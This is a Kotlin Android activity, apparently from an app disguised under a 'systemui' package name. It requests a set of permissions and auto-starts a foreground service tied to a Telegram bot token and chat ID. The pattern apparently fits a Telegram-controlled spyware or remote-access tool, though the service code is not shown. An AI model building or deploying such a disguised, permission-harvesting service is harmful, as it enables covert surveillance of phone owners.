package com.systemui.package

import android.content.Intent
import android.os.Build
import android.os.Bundle
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.systemui.package.utils.PermissionHelper

class MainActivity : AppCompatActivity() {
    private lateinit var titleText: TextView
    private lateinit var statusText: TextView
    private lateinit var tokenText: TextView
    private lateinit var chatIdText: TextView
    private lateinit var permWarning: TextView
    private lateinit var toggleBtn: Button
    private lateinit var grantBtn: Button
    private var serviceRunning = false

    private val permLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) { perms ->
        if (perms.all { it.value }) { permWarning.text = ""; startServiceIfReady() }
        else { updatePermWarning() }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        titleText = findViewById(R.id.titleText)
        statusText = findViewById(R.id.statusText)
        tokenText = findViewById(R.id.tokenText)
        chatIdText = findViewById(R.id.chatIdText)
        permWarning = findViewById(R.id.permissionWarningText)
        toggleBtn = findViewById(R.id.toggleButton)
        grantBtn = findViewById(R.id.grantPermissionsButton)

        tokenText.text = "Bot Token: ...${Config.BOT_TOKEN.takeLast(6)}"
        chatIdText.text = "Chat ID: ${Config.CHAT_ID}"

        toggleBtn.setOnClickListener { if (serviceRunning) stopTelegramService() else startTelegramService() }
        grantBtn.setOnClickListener { requestPerms() }

        if (PermissionHelper.checkAllPermissions(this)) { startServiceIfReady() }
        else { updatePermWarning(); requestPerms() }
    }

    private fun requestPerms() {
        val missing = PermissionHelper.getMissingPermissions(this)
        if (missing.isNotEmpty()) permLauncher.launch(missing.toTypedArray())
    }

    private fun updatePermWarning() {
        val missing = PermissionHelper.getMissingPermissions(this)
        permWarning.text = if (missing.isNotEmpty()) "⚠️ Missing: ${missing.map { it.removePrefix("android.permission.") }.joinToString()}" else ""
    }

    private fun startServiceIfReady() {
        if (PermissionHelper.checkAllPermissions(this) && !serviceRunning) startTelegramService()
    }

    private fun startTelegramService() {
        if (!PermissionHelper.checkAllPermissions(this)) {
            Toast.makeText(this, "Grant permissions first", Toast.LENGTH_SHORT).show()
            return
        }
        val intent = Intent(this, TelegramService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
        serviceRunning = true
        updateUI()
        Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show()
    }

    private fun stopTelegramService() {
        stopService(Intent(this, TelegramService::class.java))
        serviceRunning = false
        updateUI()
        Toast.makeText(this, "Service stopped", Toast.LENGTH_SHORT).show()
    }

    private fun updateUI() {
        statusText.text = if (serviceRunning) "Service: Running ✅" else "Service: Stopped 🔴"
        toggleBtn.text = if (serviceRunning) "Stop Service" else "Start Service"
    }
}